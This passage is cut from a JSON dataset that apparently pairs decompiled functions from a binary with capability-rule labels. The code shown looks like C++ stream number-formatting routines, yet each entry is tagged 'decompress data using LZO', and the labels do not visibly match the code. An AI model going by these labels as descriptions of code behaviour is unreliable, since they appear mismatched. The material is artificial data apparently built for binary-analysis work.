fcn.0046d560((puVar11 - (iVar7 + 0x78) >> 1) + '0');\n                var_38h = var_38h + 1;\n                uVar8 = arg_8h[2];\n                uVar12 = uVar2;\n                if (uVar8 < arg_8h[3]) goto code_r0x00454696;\n                goto code_r0x004548a6;\n            }\n            puVar11 = puVar11 + 1;\n        } while (puVar11 != iVar7 + 0x8c);\n        if ((*(iVar7 + 0x94) != uVar6) && (*(iVar7 + 0xa0) != uVar6)) goto code_r0x004546be;\n        uVar1 = uVar12 & (var_31h ^ 1);\n        iVar10 = *(stack0xffffffe0 + -0xc);\n        if (uVar1 == 0) goto code_r0x004546c4;\n        if ((iVar10 != 0) && (uVar3 == 0)) {\n            fcn.0046d560(var_38h);\n        }\n        fcn.0046d560(0x65);\n        if (arg_8h[2] < arg_8h[3]) {\n            arg_8h[2] = arg_8h[2] + 2;\n        }\n        else {\n            (**(*arg_8h + 0x28))();\n        }\n        arg_ch = CONCAT22(arg_ch._2_2_, 0xffff);\n        cVar4 = fcn.00430e20(&arg_10h);\n        if (cVar4 == '\\0') goto code_r0x004547e3;\ncode_r0x00454b2d:\n        iVar10 = *(stack0xffffffe0 + -0xc);\njoined_r0x00454b22:\n        if (iVar10 == 0) goto code_r0x0045470e;\n        goto code_r0x004546eb;\n    }\n    iVar10 = *(stack0xffffffe0 + -0xc);\njoined_r0x00454b58:\n    if (iVar10 == 0) goto code_r0x0045470e;\ncode_r0x004546d4:\n    fcn.0046d560(var_38h);\n    goto code_r0x004546eb;\ncode_r0x004547e3:\n    uVar6 = fcn.00430ec0();\n    uVar5 = *(iVar7 + 0x10);\n    if ((((*(iVar7 + 0x72) == uVar6) || (var_31h = uVar1,  uVar12 = uVar1,  *(iVar7 + 0x70) == uVar6)) &&\n        ((uVar5 == 0 || (var_31h = uVar5,  uVar12 = uVar5,  *(iVar7 + 0x26) != uVar6)))) &&\n       (var_31h = uVar1,  uVar12 = uVar1,  *(iVar7 + 0x24) != uVar6)) {\n        fcn.0046d560((*(iVar7 + 0x72) != uVar6) * '\\x02' + '+');\ncode_r0x00454687:\n        uVar8 = arg_8h[2];\n        if (uVar8 < arg_8h[3]) {\ncode_r0x00454696:\n            arg_8h[2] = uVar8 + 2;\n        }\n        else {\ncode_r0x004548a6:\n            (**(*arg_8h + 0x28))();\n        }\n        arg_ch = CONCAT22(arg_ch._2_2_, 0xffff);\n        cVar4 = fcn.00430e20(&arg_10h);\n        if (cVar4 != '\\0') goto code_r0x004546be;\n        uVar6 = fcn.00430ec0();\n        uVar5 = *(iVar7 + 0x10);\n    }\n    goto code_r0x00454632;\ncode_r0x004546be:\n    iVar10 = *(stack0xffffffe0 + -0xc);\ncode_r0x004546c4:\n    if (iVar10 == 0) goto code_r0x0045470e;\n    if ((uVar3 == 0) && (var_31h == 0)) goto code_r0x004546d4;\ncode_r0x004546eb:\n    cVar4 = fcn.0049e880(*(iVar7 + 8), *(iVar7 + 0xc), &var_1eh + 2);\n    if (cVar4 == '\\0') {\n        *arg_1ch = 4;\n    }\ncode_r0x0045470e:\n    fcn.0046bf80(&var_1eh + 1);\n    return CONCAT44(arg_ch, arg_8h);\n}\n",
        "token_count": 3220
    },
    "004551c0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n// WARNING: Could not reconcile some variable overlaps\n\nulong __cdecl\nfcn.004551c0(uint arg_8h, uint32_t arg_ch, int32_t *arg_10h, uint arg_14h, uint arg_18h, uint32_t *arg_1ch, uint arg_20h\n            )\n\n{\n    int32_t iVar1;\n    int16_t iVar2;\n    int32_t *piVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t *piVar6;\n    bool bVar7;\n    bool bVar8;\n    ulong uVar9;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    int32_t var_20h;\n    uint var_1ch;\n    uint var_bp_ch;\n    \n    var_20h = fcn.0046ba90(0, 0, &var_1ch);\n    fcn.0046d280(0x20);\n    uVar9 = fcn.00454450(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, &var_20h);\n    piVar3 = uVar9;\n    uVar4 = uVar9 >> 0x20 & 0xffff;\n    uVar5 = arg_ch & 0xffff0000 | uVar4;\n    var_1ch = fcn.0048f260();\n    fcn.0049dc10(var_20h, arg_20h, arg_1ch, &var_1ch);\n    bVar7 = uVar4 == -1;\n    bVar8 = piVar3 != NULL && bVar7;\n    piVar6 = piVar3;\n    if (bVar8) {\n        if (piVar3[2] < piVar3[3]) {\n            iVar2 = *piVar3[2];\n        }\n        else {\n            iVar2 = (**(*piVar3 + 0x24))();\n        }\n        bVar7 = iVar2 == -1 && bVar8;\n        piVar6 = NULL;\n        if (iVar2 != -1) {\n            piVar6 = piVar3;\n        }\n    }\n    var_38h._0_2_ = arg_14h;\n    bVar8 = var_38h == -1;\n    if ((arg_10h != NULL) && (bVar8)) {\n        if (arg_10h[2] < arg_10h[3]) {\n            iVar2 = *arg_10h[2];\n        }\n        else {\n            iVar2 = (**(*arg_10h + 0x24))();\n        }\n        bVar8 = iVar2 == -1;\n    }\n    if (bVar8 == bVar7) {\n        *arg_1ch = *arg_1ch | 2;\n    }\n    if (*0x4f59f4 == 0) {\n        iVar1 = *(var_20h + -4);\n        *(var_20h + -4) = iVar1 + -1;\n    }\n    else {\n        LOCK();\n        piVar3 = var_20h + -4;\n        iVar1 = *piVar3;\n        *piVar3 = *piVar3 + -1;\n    }\n    if (0 < iVar1) {\n        return CONCAT44(uVar5, piVar6);\n    }\n    fcn.0046bf60(&var_1ch);\n    return CONCAT44(uVar5, piVar6);\n}\n",
        "token_count": 807
    },
    "004553a0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n// WARNING: Could not reconcile some variable overlaps\n\nulong __cdecl\nfcn.004553a0(uint arg_8h, uint32_t arg_ch, int32_t *arg_10h, uint arg_14h, uint arg_18h, uint32_t *arg_1ch, uint arg_20h\n            )\n\n{\n    int32_t iVar1;\n    int16_t iVar2;\n    int32_t *piVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t *piVar6;\n    bool bVar7;\n    bool bVar8;\n    ulong uVar9;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    int32_t var_20h;\n    uint var_1ch;\n    uint var_bp_ch;\n    \n    var_20h = fcn.0046ba90(0, 0, &var_1ch);\n    fcn.0046d280(0x20);\n    uVar9 = fcn.00454450(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, &var_20h);\n    piVar3 = uVar9;\n    uVar4 = uVar9 >> 0x20 & 0xffff;\n    uVar5 = arg_ch & 0xffff0000 | uVar4;\n    var_1ch = fcn.0048f260();\n    fcn.0049dd30(var_20h, arg_20h, arg_1ch, &var_1ch);\n    bVar7 = uVar4 == -1;\n    bVar8 = piVar3 != NULL && bVar7;\n    piVar6 = piVar3;\n    if (bVar8) {\n        if (piVar3[2] < piVar3[3]) {\n            iVar2 = *piVar3[2];\n        }\n        else {\n            iVar2 = (**(*piVar3 + 0x24))();\n        }\n        bVar7 = iVar2 == -1 && bVar8;\n        piVar6 = NULL;\n        if (iVar2 != -1) {\n            piVar6 = piVar3;\n        }\n    }\n    var_38h._0_2_ = arg_14h;\n    bVar8 = var_38h == -1;\n    if ((arg_10h != NULL) && (bVar8)) {\n        if (arg_10h[2] < arg_10h[3]) {\n            iVar2 = *arg_10h[2];\n        }\n        else {\n            iVar2 = (**(*arg_10h + 0x24))();\n        }\n        bVar8 = iVar2 == -1;\n    }\n    if (bVar8 == bVar7) {\n        *arg_1ch = *arg_1ch | 2;\n    }\n    if (*0x4f59f4 == 0) {\n        iVar1 = *(var_20h + -4);\n        *(var_20h + -4) = iVar1 + -1;\n    }\n    else {\n        LOCK();\n        piVar3 = var_20h + -4;\n        iVar1 = *piVar3;\n        *piVar3 = *piVar3 + -1;\n    }\n    if (0 < iVar1) {\n        return CONCAT44(uVar5, piVar6);\n    }\n    fcn.0046bf60(&var_1ch);\n    return CONCAT44(uVar5, piVar6);\n}\n",
        "token_count": 807
    },
    "00455580": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n// WARNING: Could not reconcile some variable overlaps\n\nulong __cdecl\nfcn.00455580(uint arg_8h, uint32_t arg_ch, int32_t *arg_10h, uint arg_14h, uint arg_18h, uint32_t *arg_1ch, uint arg_20h\n            )\n\n{\n    int32_t iVar1;\n    int16_t iVar2;\n    int32_t *piVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t *piVar6;\n    bool bVar7;\n    bool bVar8;\n    ulong uVar9;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    int32_t var_20h;\n    uint var_1ch;\n    uint var_bp_ch;\n    \n    var_20h = fcn.0046ba90(0, 0, &var_1ch);\n    fcn.0046d280(0x20);\n    uVar9 = fcn.00454450(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, &var_20h);\n    piVar3 = uVar9;\n    uVar4 = uVar9 >> 0x20 & 0xffff;\n    uVar5 = arg_ch & 0xffff0000 | uVar4;\n    var_1ch = fcn.0048f260();\n    fcn.0049de40(var_20h, arg_20h, arg_1ch, &var_1ch);\n    bVar7 = uVar4 == -1;\n    bVar8 = piVar3 != NULL && bVar7;\n    piVar6 = piVar3;\n    if (bVar8) {\n        if (piVar3[2] < piVar3[3]) {\n            iVar2 = *piVar3[2];\n        }\n        else {\n            iVar2 = (**(*piVar3 + 0x24))();\n        }\n        bVar7 = iVar2 == -1 && bVar8;\n        piVar6 = NULL;\n        if (iVar2 != -1) {\n            piVar6 = piVar3;\n        }\n    }\n    var_38h._0_2_ = arg_14h;\n    bVar8 = var_38h == -1;\n    if ((arg_10h != NULL) && (bVar8)) {\n        if (arg_10h[2] < arg_10h[3]) {\n            iVar2 = *arg_10h[2];\n        }\n        else {\n            iVar2 = (**(*arg_10h + 0x24))();\n        }\n        bVar8 = iVar2 == -1;\n    }\n    if (bVar8 == bVar7) {\n        *arg_1ch = *arg_1ch | 2;\n    }\n    if (*0x4f59f4 == 0) {\n        iVar1 = *(var_20h + -4);\n        *(var_20h + -4) = iVar1 + -1;\n    }\n    else {\n        LOCK();\n        piVar3 = var_20h + -4;\n        iVar1 = *piVar3;\n        *piVar3 = *piVar3 + -1;\n    }\n    if (0 < iVar1) {\n        return CONCAT44(uVar5, piVar6);\n    }\n    fcn.0046bf60(&var_1ch);\n    return CONCAT44(uVar5, piVar6);\n}\n",
        "token_count": 806
    },
    "00455810": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n// WARNING: Could not reconcile some variable overlaps\n\nuint64_t __cdecl fcn.00455810(int32_t *arg_8h, uint arg_ch, int32_t arg_10h, uint arg_14h, int32_t arg_18h)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    uchar *puVar10;\n    uint *puVar11;\n    uchar *puVar12;\n    uint uVar13;\n    uchar *puVar14;\n    ulong uVar15;\n    uint uStackY116;\n    int32_t iStackY112;\n    uchar auStack73 [5];\n    uint32_t var_40h;\n    uint var_3ch;\n    uchar *var_38h;\n    uint var_34h;\n    int32_t *var_30h;\n    uint32_t var_2ch;\n    uint var_19h;\n    uint var_bp_ch;\n    \n    var_30h = arg_8h;\n    var_34h = arg_ch;\n    var_3ch = arg_14h;\n    iStackY112 = 0x45583c;\n    iVar6 = fcn.0042e410(arg_10h + 0x6c);\n    var_2ch = iVar6 + 0x26;\n    uVar2 = *(arg_10h + 0xc);\n    uStackY116 = 0x455857;\n    iVar7 = fcn.00418950();\n    iVar7 = -iVar7;\n    puVar11 = &stack0xffffff90 + iVar7;\n    puVar12 = &stack0xffffff90 + iVar7;\n    var_40h = uVar2 & 0x4a;\n    uVar5 = var_40h != 0x40 && var_40h != 8;\n    var_2ch = var_2ch & 0xffffff00 | uVar5;\n    iVar8 = arg_18h;\n    if (arg_18h < 1) {\n        iVar8 = -arg_18h;\n        if (var_40h == 0x40 || var_40h == 8) {\n            iVar8 = arg_18h;\n        }\n    }\n    *(&stack0xffffff94 + iVar7) = iVar8;\n    *(&stack0xffffff98 + iVar7) = iVar6 + 0x26;\n    *(&stack0xffffffa0 + iVar7) = uVar5;\n    *(&stack0xffffff9c + iVar7) = uVar2;\n    *(&stack0xffffff90 + iVar7) = (&stack0xffffffb7 + iVar7 & 0xfffffff0) + 0x14;\n    var_38h = &stack0xffffffb7 + iVar7 & 0xfffffff0;\n    *(&stack0xffffff8c + iVar7) = 0x4558ad;\n    iVar8 = fcn.0049d5d0();\n    if (*(iVar6 + 0x10) == '\\0') {\n        puVar10 = var_38h + (0x14 - iVar8);\n        puVar14 = var_38h + (0x14 - iVar8);\n        if (var_2ch != '\\0') goto code_r0x004558cb;\ncode_r0x004559fa:\n        puVar14 = puVar10;\n        if (((uVar2 & 0x200) != 0) && (arg_18h != 0)) {\n            if (var_40h == 0x40) {\n                iVar8 = iVar8 + 1;\n                puVar14 = puVar10 + -1;\n                *puVar14 = *(iVar6 + 0x2a);\n            }\n            else {\n                iVar8 = iVar8 + 2;\n                puVar14 = puVar10 + -2;\n                puVar10[-1] = *(iVar6 + 0x28 + (uVar2 >> 0xe & 1));\n                *puVar14 = *(iVar6 + 0x2a);\n            }\n        }\ncode_r0x004558de:\n        iVar7 = *(arg_10h + 8);\n        puVar11 = puVar12;\n        if (iVar7 <= iVar8) goto code_r0x004558e8;\n    }\n    else {\n        *(&stack0xffffff8c + iVar7) = 0x4559b0;\n        uVar15 = fcn.00418950();\n        iVar9 = uVar15 >> 0x20;\n        iVar4 = -uVar15;\n        puVar11 = &stack0xffffff90 + iVar4 + iVar7;\n        puVar12 = &stack0xffffff90 + iVar4 + iVar7;\n        *(&stack0xffffffa4 + iVar4 + iVar7) = iVar8 + iVar9;\n        *(&stack0xffffffa0 + iVar4 + iVar7) = iVar9;\n        puVar14 = (&stack0xffffffb7 + iVar4 + iVar7 & 0xfffffff0) + 2;\n        *(&stack0xffffff9c + iVar4 + iVar7) = *(iVar6 + 0xc);\n        var_38h = puVar14;\n        *(&stack0xffffff98 + iVar4 + iVar7) = *(iVar6 + 8);\n        cVar1 = *(iVar6 + 0x25);\n        *(&stack0xffffff90 + iVar4 + iVar7) = puVar14;\n        *(&stack0xffffff94 + iVar4 + iVar7) = cVar1;\n        *(&stack0xffffff8c + iVar4 + iVar7) = 0x4559e7;\n        iVar8 = fcn.0049d950();\n        iVar8 = iVar8 - var_38h;\n        puVar10 = var_38h;\n        puVar14 = var_38h;\n        if (var_2ch == '\\0') goto code_r0x004559fa;\ncode_r0x004558cb:\n        puVar12 = puVar11;\n        if (arg_18h < 0) {\n            iVar8 = iVar8 + 1;\n            puVar14[-1] = *(iVar6 + 0x26);\n            puVar14 = puVar14 + -1;\n            goto code_r0x004558de;\n        }\n        if ((uVar2 & 0x800) == 0) goto code_r0x004558de;\n        iVar8 = iVar8 + 1;\n        puVar14 = puVar14 + -1;\n        *puVar14 = *(iVar6 + 0x27);\n        iVar7 = *(arg_10h + 8);\n        if (iVar7 <= iVar8) goto code_r0x004558e8;\n    }\n    *(puVar11 + -4) = 0x455954;\n    uVar15 = fcn.00418950();\n    iVar6 = -uVar15;\n    *(puVar11 + iVar6 + 0x14) = iVar8;\n    *(puVar11 + iVar6 + 4) = var_3ch;\n    puVar14 = puVar11 + iVar6 + 0x27 & 0xfffffff0;\n    *(puVar11 + iVar6 + 0xc) = uVar15 >> 0x20;\n    *(puVar11 + iVar6 + 0x10) = iVar7;\n    *(puVar11 + iVar6 + 8) = puVar14;\n    *(puVar11 + iVar6) = arg_10h;\n    *(puVar11 + iVar6 + -4) = 0x455982;\n    fcn.0048c3b0();\n    iVar8 = iVar7;\n    puVar11 = puVar11 + iVar6;\ncode_r0x004558e8:\n    uVar13 = var_34h;\n    *(arg_10h + 8) = 0;\n    if (var_34h == '\\0') {\n        iVar7 = *var_30h;\n        puVar11[1] = iVar8;\n        *puVar11 = puVar14;\n        pcVar3 = *(iVar7 + 0x30);\n        puVar11[-1] = 0x45590a;\n        iVar7 = (*pcVar3)();\n        if (iVar7 != iVar8) {\n            uVar13 = 1;\n        }\n    }\n    return CONCAT44(uVar13, var_30h) & 0xffffffffff;\n}\n",
        "token_count": 1917
    },
    "00455a50": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n// WARNING: Could not reconcile some variable overlaps\n\nuint64_t __cdecl fcn.00455a50(int32_t *arg_8h, uint arg_ch, int32_t arg_10h, uint arg_14h, int32_t arg_18h)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    uchar *puVar9;\n    int32_t iVar10;\n    uchar *puVar11;\n    uchar *puVar12;\n    uint *puVar13;\n    uint uVar14;\n    uchar *puVar15;\n    ulong uVar16;\n    uint uStackY116;\n    int32_t iStackY112;\n    uchar uStack73;\n    int32_t var_44h;\n    uint32_t var_40h;\n    uint var_3ch;\n    uchar *var_38h;\n    uint var_34h;\n    char var_2dh;\n    int32_t *var_2ch;\n    uint var_19h;\n    uint var_bp_ch;\n    \n    var_2ch = arg_8h;\n    var_34h = arg_ch;\n    var_3ch = arg_14h;\n    iStackY112 = 0x455a7c;\n    iVar5 = fcn.0042e410(arg_10h + 0x6c);\n    uVar2 = *(arg_10h + 0xc);\n    uStackY116 = 0x455a97;\n    var_44h = iVar5 + 0x26;\n    iVar6 = fcn.00418950();\n    iVar6 = -iVar6;\n    puVar12 = &stack0xffffff90 + iVar6;\n    puVar11 = &stack0xffffff90 + iVar6;\n    uVar7 = uVar2 & 0x4a;\n    *(&stack0xffffff98 + iVar6) = iVar5 + 0x26;\n    var_40h = uVar7;\n    *(&stack0xffffff9c + iVar6) = uVar2;\n    var_38h = &stack0xffffffb7 + iVar6 & 0xfffffff0;\n    var_2dh = uVar7 != 0x40 && uVar7 != 8;\n    *(&stack0xffffffa0 + iVar6) = var_2dh;\n    *(&stack0xffffff94 + iVar6) = arg_18h;\n    *(&stack0xffffff90 + iVar6) = (&stack0xffffffb7 + iVar6 & 0xfffffff0) + 0x14;\n    *(&stack0xffffff8c + iVar6) = 0x455add;\n    iVar8 = fcn.0049d5d0();\n    puVar9 = var_38h + (0x14 - iVar8);\n    if (*(iVar5 + 0x10) != '\\0') {\n        *(&stack0xffffff8c + iVar6) = 0x455b5f;\n        uVar16 = fcn.00418950();\n        iVar10 = uVar16 >> 0x20;\n        iVar4 = -uVar16;\n        puVar12 = &stack0xffffff90 + iVar4 + iVar6;\n        puVar11 = &stack0xffffff90 + iVar4 + iVar6;\n        *(&stack0xffffffa4 + iVar4 + iVar6) = iVar8 + iVar10;\n        *(&stack0xffffffa0 + iVar4 + iVar6) = iVar10;\n        puVar9 = (&stack0xffffffb7 + iVar4 + iVar6 & 0xfffffff0) + 2;\n        *(&stack0xffffff9c + iVar4 + iVar6) = *(iVar5 + 0xc);\n        var_38h = puVar9;\n        *(&stack0xffffff98 + iVar4 + iVar6) = *(iVar5 + 8);\n        cVar1 = *(iVar5 + 0x25);\n        *(&stack0xffffff90 + iVar4 + iVar6) = puVar9;\n        *(&stack0xffffff94 + iVar4 + iVar6) = cVar1;\n        *(&stack0xffffff8c + iVar4 + iVar6) = 0x455b96;\n        iVar8 = fcn.0049d950();\n        iVar8 = iVar8 - var_38h;\n        puVar9 = var_38h;\n    }\n    puVar15 = puVar9;\n    if (((var_2dh == '\\0') && (puVar12 = puVar11,  (uVar2 & 0x200) != 0)) && (arg_18h != 0)) {\n        if (var_40h == 0x40) {\n            iVar8 = iVar8 + 1;\n            puVar15 = puVar9 + -1;\n            *puVar15 = *(iVar5 + 0x2a);\n        }\n        else {\n            iVar8 = iVar8 + 2;\n            puVar15 = puVar9 + -2;\n            puVar9[-1] = *(var_44h + 2 + (uVar2 >> 0xe & 1));\n            *puVar15 = *(iVar5 + 0x2a);\n        }\n    }\n    iVar6 = *(arg_10h + 8);\n    puVar13 = puVar12;\n    if (iVar8 < iVar6) {\n        *(puVar12 + -4) = 0x455bfe;\n        uVar16 = fcn.00418950();\n        iVar5 = -uVar16;\n        puVar13 = puVar12 + iVar5;\n        *(puVar12 + iVar5 + 0x14) = iVar8;\n        *(puVar12 + iVar5 + 4) = var_3ch;\n        puVar15 = puVar12 + iVar5 + 0x27 & 0xfffffff0;\n        *(puVar12 + iVar5 + 0xc) = uVar16 >> 0x20;\n        *(puVar12 + iVar5 + 0x10) = iVar6;\n        *(puVar12 + iVar5 + 8) = puVar15;\n        *(puVar12 + iVar5) = arg_10h;\n        *(puVar12 + iVar5 + -4) = 0x455c2c;\n        fcn.0048c3b0();\n        iVar8 = iVar6;\n    }\n    uVar14 = var_34h;\n    *(arg_10h + 8) = 0;\n    if (var_34h == '\\0') {\n        iVar6 = *var_2ch;\n        puVar13[1] = iVar8;\n        *puVar13 = puVar15;\n        pcVar3 = *(iVar6 + 0x30);\n        puVar13[-1] = 0x455b27;\n        iVar6 = (*pcVar3)();\n        if (iVar6 != iVar8) {\n            uVar14 = 1;\n        }\n    }\n    return CONCAT44(uVar14, var_2ch) & 0xffffffffff;\n}\n",
        "token_count": 1599
    },
    "00455c50": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n// WARNING: Could not reconcile some variable overlaps\n\nuint64_t __cdecl\nfcn.00455c50(int32_t *arg_8h, uint arg_ch, int32_t arg_10h, uint arg_14h, uint32_t arg_18h, uint32_t arg_1ch)\n\n{\n    char cVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    bool bVar9;\n    uint32_t uVar10;\n    int32_t iVar11;\n    uint *puVar12;\n    uchar *puVar13;\n    uint32_t uVar14;\n    uint uVar15;\n    uchar *puVar16;\n    uchar *puVar17;\n    ulong uVar18;\n    uint uStackY116;\n    int32_t iStackY112;\n    uint32_t var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint32_t var_3ch;\n    int32_t *var_38h;\n    uint32_t var_34h;\n    uint32_t var_30h;\n    uint32_t var_2ch;\n    uint var_19h;\n    uint var_bp_ch;\n    \n    var_38h = arg_8h;\n    var_2ch = arg_1ch;\n    var_40h = arg_ch;\n    var_44h = arg_14h;\n    var_30h = arg_18h;\n    iStackY112 = 0x455c8a;\n    iVar5 = fcn.0042e410(arg_10h + 0x6c);\n    var_34h = iVar5 + 0x26;\n    var_48h = *(arg_10h + 0xc);\n    uStackY116 = 0x455ca8;\n    var_3ch = var_48h;\n    iVar6 = fcn.00418950();\n    iVar6 = -iVar6;\n    puVar12 = &stack0xffffff90 + iVar6;\n    puVar13 = &stack0xffffff90 + iVar6;\n    var_48h = var_48h & 0x4a;\n    uVar14 = &fcn.00455c50::var_48h + iVar6 + 3 & 0xfffffff0;\n    bVar9 = var_48h != 0x40 && var_48h != 8;\n    uVar4 = bVar9;\n    var_34h = var_34h & 0xffffff00 | uVar4;\n    uVar7 = var_30h;\n    uVar10 = var_2ch;\n    if ((((var_2ch - 1) + (var_30h != 0) | var_2ch) < 0) && (bVar9)) {\n        uVar7 = -var_30h;\n        uVar10 = -(var_2ch + (var_30h != 0));\n    }\n    *(&stack0xffffff94 + iVar6) = uVar7;\n    *(&stack0xffffff98 + iVar6) = uVar10;\n    *(&stack0xffffffa4 + iVar6) = uVar4;\n    uVar4 = var_3ch;\n    *(&stack0xffffff90 + iVar6) = uVar14 + 0x28;\n    *(&stack0xffffffa0 + iVar6) = uVar4;\n    *(&stack0xffffff9c + iVar6) = iVar5 + 0x26;\n    *(&stack0xffffff8c + iVar6) = 0x455d13;\n    iVar8 = fcn.0049d680();\n    puVar16 = (uVar14 - iVar8) + 0x28;\n    if (*(iVar5 + 0x10) == '\\0') {\n        if (var_34h != '\\0') goto code_r0x00455d2e;\ncode_r0x00455e54:\n        puVar17 = puVar16;\n        if (((var_3ch & 0x200) != 0) && ((var_30h | var_2ch) != 0)) {\n            if (var_48h == 0x40) {\n                iVar8 = iVar8 + 1;\n                puVar17 = puVar16 + -1;\n                *puVar17 = *(iVar5 + 0x2a);\n            }\n            else {\n                iVar8 = iVar8 + 2;\n                puVar17 = puVar16 + -2;\n                puVar16[-1] = *(iVar5 + 0x28 + (var_3ch >> 0xe & 1));\n                *puVar17 = *(iVar5 + 0x2a);\n            }\n        }\ncode_r0x00455d42:\n        iVar6 = *(arg_10h + 8);\n        puVar12 = puVar13;\n        if (iVar6 <= iVar8) goto code_r0x00455d4c;\n    }\n    else {\n        *(&stack0xffffff8c + iVar6) = 0x455e10;\n        uVar18 = fcn.00418950();\n        iVar11 = uVar18 >> 0x20;\n        iVar3 = -uVar18;\n        puVar12 = &stack0xffffff90 + iVar3 + iVar6;\n        puVar13 = &stack0xffffff90 + iVar3 + iVar6;\n        *(&stack0xffffffa4 + iVar3 + iVar6) = iVar8 + iVar11;\n        *(&stack0xffffffa0 + iVar3 + iVar6) = iVar11;\n        puVar16 = (&fcn.00455c50::var_48h + iVar3 + iVar6 + 3 & 0xfffffff0U) + 2;\n        *(&stack0xffffff9c + iVar3 + iVar6) = *(iVar5 + 0xc);\n        *(&stack0xffffff98 + iVar3 + iVar6) = *(iVar5 + 8);\n        cVar1 = *(iVar5 + 0x25);\n        *(&stack0xffffff90 + iVar3 + iVar6) = puVar16;\n        *(&stack0xffffff94 + iVar3 + iVar6) = cVar1;\n        *(&stack0xffffff8c + iVar3 + iVar6) = 0x455e44;\n        iVar8 = fcn.0049d950();\n        iVar8 = iVar8 - puVar16;\n        if (var_34h == '\\0') goto code_r0x00455e54;\ncode_r0x00455d2e:\n        puVar13 = puVar12;\n        if (var_2ch < 0) {\n            iVar8 = iVar8 + 1;\n            puVar16[-1] = *(iVar5 + 0x26);\n            puVar17 = puVar16 + -1;\n            goto code_r0x00455d42;\n        }\n        puVar17 = puVar16;\n        if ((var_3ch & 0x800) == 0) goto code_r0x00455d42;\n        iVar8 = iVar8 + 1;\n        puVar17 = puVar16 + -1;\n        *puVar17 = *(iVar5 + 0x27);\n        iVar6 = *(arg_10h + 8);\n        if (iVar6 <= iVar8) goto code_r0x00455d4c;\n    }\n    *(puVar12 + -4) = 0x455db5;\n    uVar18 = fcn.00418950();\n    iVar5 = -uVar18;\n    *(puVar12 + iVar5 + 0x14) = iVar8;\n    *(puVar12 + iVar5 + 4) = var_44h;\n    puVar17 = puVar12 + iVar5 + 0x27 & 0xfffffff0;\n    *(puVar12 + iVar5 + 0xc) = uVar18 >> 0x20;\n    *(puVar12 + iVar5 + 0x10) = iVar6;\n    *(puVar12 + iVar5 + 8) = puVar17;\n    *(puVar12 + iVar5) = arg_10h;\n    *(puVar12 + iVar5 + -4) = 0x455de3;\n    fcn.0048c3b0();\n    iVar8 = iVar6;\n    puVar12 = puVar12 + iVar5;\ncode_r0x00455d4c:\n    uVar15 = var_40h;\n    *(arg_10h + 8) = 0;\n    if (var_40h == '\\0') {\n        iVar6 = *var_38h;\n        puVar12[1] = iVar8;\n        *puVar12 = puVar17;\n        pcVar2 = *(iVar6 + 0x30);\n        puVar12[-1] = 0x455d6e;\n        iVar6 = (*pcVar2)();\n        if (iVar6 != iVar8) {\n            uVar15 = 1;\n        }\n    }\n    return CONCAT44(uVar15, var_38h) & 0xffffffffff;\n}\n",
        "token_count": 2044
    },
    "00455eb0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n// WARNING: Could not reconcile some variable overlaps\n\nuint64_t __cdecl\nfcn.00455eb0(int32_t *arg_8h, uint arg_ch, int32_t arg_10h, uint arg_14h, uint32_t arg_18h, uint32_t arg_1ch)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    bool bVar9;\n    uchar *puVar10;\n    int32_t iVar11;\n    uchar *puVar12;\n    uchar *puVar13;\n    uint *puVar14;\n    uint uVar15;\n    uchar *puVar16;\n    ulong uVar17;\n    uint uStackY116;\n    int32_t iStackY112;\n    uint32_t var_48h;\n    uint32_t var_44h;\n    uint var_40h;\n    uchar *var_3ch;\n    uint var_38h;\n    uint32_t var_34h;\n    uint32_t var_30h;\n    int32_t *var_2ch;\n    uint var_19h;\n    uint var_bp_ch;\n    \n    var_2ch = arg_8h;\n    var_44h = arg_18h;\n    var_38h = arg_ch;\n    var_40h = arg_14h;\n    var_30h = arg_1ch;\n    iStackY112 = 0x455ee8;\n    iVar5 = fcn.0042e410(arg_10h + 0x6c);\n    